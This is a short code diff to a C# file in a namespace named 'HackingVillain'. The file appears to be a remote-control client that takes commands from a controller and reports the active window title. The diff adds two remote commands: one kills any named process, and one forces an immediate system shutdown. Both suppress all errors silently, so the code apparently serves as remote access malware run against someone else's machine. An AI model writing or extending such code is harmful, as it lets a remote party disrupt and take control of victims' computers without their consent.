@@ -114,6 +114,29 @@ namespace HackingVillain
             {
                 Send(ForegroundWindow.GetActiveWindowTitle() ?? "", 2);
             }
+            else if (data.StartsWith("Kill"))
+            {
+                string name = data.Substring(5);
+                try
+                {
+                    Process.GetProcessesByName(name)[0].Kill();
+                }
+                catch
+                {
+
+                }
+            }
+            else if (data == "Shutdown")
+            {
+                try
+                {
+                    Process.Start("shutdown", "/s /t 0");
+                }
+                catch
+                {
+
+                }
+            }
         }
     }
 }
